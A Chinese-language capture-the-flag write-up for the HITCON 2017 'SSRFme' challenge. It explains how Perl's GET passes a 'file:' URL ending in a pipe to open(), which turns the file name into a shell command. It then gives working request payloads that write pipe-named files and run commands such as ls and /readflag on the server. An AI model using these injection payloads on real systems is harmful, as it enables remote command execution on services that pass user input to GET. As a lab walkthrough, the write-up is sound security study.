# [HITCON 2017]SSRFme perl语言的 GET open file 造成rce

这里记录学习一下 perl的open缺陷

这里首先本地测试一下



<img src="https://i-blog.csdnimg.cn/blog_migrate/129760e7083f0f650586b4c436b6153f.png" alt="" style="max-height:148px; box-sizing:content-box;" />


发现这里使用open打开 的时候 如果通过管道符就会实现命令执行

然后这里注意的是 perl 中的get调用了 open的参数 所以其实我们可以通过管道符实现命令执行

然后这里如果file可控那么就继续可以实现命令执行

这里就是 open支持file协议

file协议加上| 可以将文件名 作为shell输出

```sql
touch 'id|'
 
GET 'file:id|'
```

类似这种

然后我们可以开始做这个题目

```bash
    $data = shell_exec("GET " . escapeshellarg($_GET["url"]));
    $info = pathinfo($_GET["filename"]);
    $dir  = str_replace(".", "", basename($info["dirname"]));
```

这里是内容 我们输入通过GET url 可以实现写入一个文件

这里考的其实就是

我们通过filename生成一个shell文件（名字为shell）

然后通过（GET filename）这种形式实现命令执行 然后再写入一个文件

这里可能比较抽象 我们来本地测试一下

这里我们首先可以通过

```python
    @mkdir($dir);
    @chdir($dir);
    @file_put_contents(basename($info["basename"]), $data);
```

这种确定是perl语言

然后

我们首先传入

```cobol
url=123&filename=ls|   //目的创建一个shell名字的文件
 
 
然后
 
url=file:ls|&filename=1.txt  // 通过file协议和| 让ls不做为文件名 而变为shell
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/c94b6a031dcb617aa60283e4486438b2.png" alt="" style="max-height:243px; box-sizing:content-box;" />


首先了命令执行

然后

这里可以发现是一个二进制文件 无法获取flag 我们通过 bash开启操作即可

```cobol
?url=123|&filename=bash -c /readflag|
 
/?url=file:bash -c /readflag|&filename=1.txt
```

然后我们就获取到了flag 这里或者可以通过反弹shell实现 但是麻烦了